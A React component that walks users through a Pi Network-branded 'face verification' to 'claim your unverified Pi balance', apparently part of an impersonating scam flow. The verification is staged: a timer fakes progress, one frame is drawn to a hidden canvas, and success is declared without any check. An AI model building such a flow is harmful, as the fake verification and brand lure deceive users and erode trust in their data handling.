
'use client';

import { useState, useRef, useEffect } from 'react';

interface FaceVerificationProps {
  onNext: (data: any) => void;
}

export default function FaceVerification({ onNext }: FaceVerificationProps) {
  const [stage, setStage] = useState('agreement'); // agreement, instructions, ready, camera, capturing, success
  const [agreedToLicense, setAgreedToLicense] = useState(false);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [captureProgress, setCaptureProgress] = useState(0);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const handleAgreement = () => {
    if (agreedToLicense) {
      setStage('instructions');
    }
  };

  const handleInstructionsRead = () => {
    setStage('ready');
  };

  const handleReady = () => {
    setStage('camera');
    startCamera();
  };

  const startCamera = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' },
        audio: false 
      });
      setStream(mediaStream);
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        videoRef.current.play();
      }
      setTimeout(() => {
        setStage('capturing');
        startCapturing();
      }, 2000);
    } catch (error) {
      console.error('Error accessing camera:', error);
    }
  };

  const startCapturing = () => {
    let progress = 0;
    const interval = setInterval(() => {
      progress += 2;
      setCaptureProgress(progress);
      
      if (progress >= 100) {
        clearInterval(interval);
        captureImage();
        setTimeout(() => {
          setStage('success');
          if (stream) {
            stream.getTracks().forEach(track => track.stop());
          }
          setTimeout(() => {
            onNext({ faceData: 'captured' });
          }, 2000);
        }, 1000);
      }
    }, 100);
  };

  const captureImage = () => {
    if (videoRef.current && canvasRef.current) {
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');
      if (context) {
        canvas.width = videoRef.current.videoWidth;
        canvas.height = videoRef.current.videoHeight;
        context.drawImage(videoRef.current, 0, 0);
      }
    }
  };

  useEffect(() => {
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, [stream]);

  if (stage === 'agreement') {
    return (
      <div className="bg-white rounded-2xl shadow-2xl p-8">
        <div className="text-center mb-6">
          <div className="w-16 h-16 bg-gradient-to-br from-purple-500 to-purple-700 rounded-full flex items-center justify-center mx-auto mb-4">
            <i className="ri-shield-check-line text-white text-2xl"></i>
          </div>
          <h2 className="text-2xl font-bold text-gray-800 mb-2">Agreement & License</h2>
          <p className="text-gray-600">Please read and accept the terms</p>
        </div>

        <div className="bg-gray-50 rounded-xl p-4 mb-6 max-h-48 overflow-y-auto">
          <h3 className="font-semibold text-gray-800 mb-3">Face Verification License Agreement</h3>
          <div className="text-sm text-gray-700 space-y-2">
            <p>By proceeding with face verification, you agree to:</p>
            <ul className="list-disc list-inside space-y-1 ml-4">
              <li>Allow temporary access to your camera for verification purposes</li>
              <li>The capture and processing of your facial biometric data</li>
              <li>Data will be used solely for Pi Network identity verification</li>
              <li>Your biometric data will be securely stored and protected</li>
              <li>You have the right to withdraw consent at any time</li>
            </ul>
            <p className="mt-3">This verification is required to claim your unverified Pi balance and ensure account security.</p>
          </div>
        </div>

        <div className="flex items-center space-x-3 mb-6">
          <input
            type="checkbox"
            id="agreement"
            checked={agreedToLicense}
            onChange={(e) => setAgreedToLicense(e.target.checked)}
            className="w-5 h-5 text-purple-500 border-gray-300 rounded focus:ring-purple-500"
          />
          <label htmlFor="agreement" className="text-sm text-gray-700">
            I have read and agree to the Face Verification License Agreement
          </label>
        </div>

        <button
          onClick={handleAgreement}
          disabled={!agreedToLicense}
          className="w-full bg-gradient-to-r from-purple-600 to-purple-800 text-white font-semibold py-3 px-6 rounded-xl hover:from-purple-700 hover:to-purple-900 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed whitespace-nowrap cursor-pointer"
        >
          Accept & Continue
        </button>
      </div>
    );
  }

  if (stage === 'instructions') {
    return (
      <div className="bg-white rounded-2xl shadow-2xl p-8">
        <div className="text-center mb-6">
          <div className="w-16 h-16 bg-gradient-to-br from-purple-500 to-purple-700 rounded-full flex items-center justify-center mx-auto mb-4">
            <i className="ri-information-line text-white text-2xl"></i>
          </div>
          <h2 className="text-2xl font-bold text-gray-800 mb-2">Verification Instructions</h2>
          <p className="text-gray-600">Please follow these guidelines</p>
        </div>

        <div className="space-y-4 mb-8">
          <div className="flex items-start space-x-3 p-4 bg-red-50 rounded-xl">
            <i className="ri-close-circle-line text-red-500 text-xl mt-0.5"></i>
            <div>
              <h3 className="font-semibold text-red-800">Don't wear sunglasses</h3>
              <p className="text-sm text-red-700">Remove any eyewear that covers your eyes</p>
            </div>
          </div>

          <div className="flex items-start space-x-3 p-4 bg-red-50 rounded-xl">
            <i className="ri-close-circle-line text-red-500 text-xl mt-0.5"></i>
            <div>
              <h3 className="font-semibold text-red-800">Don't cover your face</h3>
              <p className="text-sm text-red-700">Keep your face fully visible and uncovered</p>
            </div>
          </div>

          <div className="flex items-start space-x-3 p-4 bg-red-50 rounded-xl">
            <i className="ri-close-circle-line text-red-500 text-xl mt-0.5"></i>
            <div>
              <h3 className="font-semibold text-red-800">Don't stand in low light</h3>
              <p className="text-sm text-red-700">Ensure good lighting on your face</p>
            </div>
          </div>

          <div className="flex items-start space-x-3 p-4 bg-green-50 rounded-xl">
            <i className="ri-check-circle-line text-green-500 text-xl mt-0.5"></i>
            <div>
              <h3 className="font-semibold text-green-800">Look directly at camera</h3>
              <p className="text-sm text-green-700">Keep your face centered and still</p>
            </div>
          </div>
        </div>

        <button
          onClick={handleInstructionsRead}
          className="w-full bg-gradient-to-r from-purple-600 to-purple-800 text-white font-semibold py-3 px-6 rounded-xl hover:from-purple-700 hover:to-purple-900 transition-all duration-300 whitespace-nowrap cursor-pointer"
        >
          I Understand
        </button>
      </div>
    );
  }

  if (stage === 'ready') {
    return (
      <div className="bg-white rounded-2xl shadow-2xl p-8 text-center">
        <div className="w-16 h-16 bg-gradient-to-br from-purple-500 to-purple-700 rounded-full flex items-center justify-center mx-auto mb-4">
          <i className="ri-camera-line text-white text-2xl"></i>
        </div>
        <h2 className="text-2xl font-bold text-gray-800 mb-4">Ready for Verification?</h2>
        <p className="text-gray-600 mb-8">Make sure you're in a well-lit area and ready to capture your face</p>
        
        <button
          onClick={handleReady}
          className="w-full bg-gradient-to-r from-purple-600 to-purple-800 text-white font-semibold py-4 px-6 rounded-xl hover:from-purple-700 hover:to-purple-900 transition-all duration-300 whitespace-nowrap cursor-pointer"
        >
          I'm Ready - Start Camera
        </button>
      </div>
    );
  }

  if (stage === 'camera' || stage === 'capturing') {
    return (
      <div className="bg-white rounded-2xl shadow-2xl p-8">
        <div className="text-center mb-6">
          <h2 className="text-2xl font-bold text-gray-800 mb-2">Face Verification</h2>
          <p className="text-gray-600">
            {stage === 'camera' ? 'Position your face in the circle' : 'Hold still while we capture your image'}
          </p>
        </div>

        <div className="relative mb-6">
          <div className="relative w-64 h-64 mx-auto rounded-full overflow-hidden border-4 border-purple-500">
            <video
              ref={videoRef}
              className="w-full h-full object-cover"
              autoPlay
              muted
              playsInline
            />
            {stage === 'capturing' && (
              <div className="absolute inset-0 bg-purple-500/20 flex items-center justify-center">
                <div className="text-white text-center">
                  <div className="text-3xl font-bold mb-2">{captureProgress}%</div>
                  <div className="text-sm">Capturing...</div>
                </div>
              </div>
            )}
          </div>
          {stage === 'capturing' && (
            <div className="absolute bottom-0 left-0 right-0 h-1 bg-gray-200 rounded-full mx-8">
              <div 
                className="h-full bg-gradient-to-r from-purple-600 to-purple-800 rounded-full transition-all duration-100"
                style={{ width: `${captureProgress}%` }}
              />
            </div>
          )}
        </div>

        <canvas ref={canvasRef} className="hidden" />

        <div className="text-center">
          <div className="inline-flex items-center space-x-2 text-sm text-gray-600">
            <i className="ri-camera-line"></i>
            <span>{stage === 'camera' ? 'Camera active' : 'Processing verification'}</span>
          </div>
        </div>
      </div>
    );
  }

  if (stage === 'success') {
    return (
      <div className="bg-white rounded-2xl shadow-2xl p-8 text-center">
        <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
          <i className="ri-check-line text-white text-2xl"></i>
        </div>
        <h2 className="text-2xl font-bold text-gray-800 mb-4">Face Captured Successfully!</h2>
        <p className="text-gray-600 mb-6">Your face verification has been completed</p>
        
        <div className="flex items-center justify-center space-x-2 text-green-600">
          <i className="ri-loader-4-line animate-spin"></i>
          <span>Processing to next step...</span>
        </div>
      </div>
    );
  }

  return null;
}
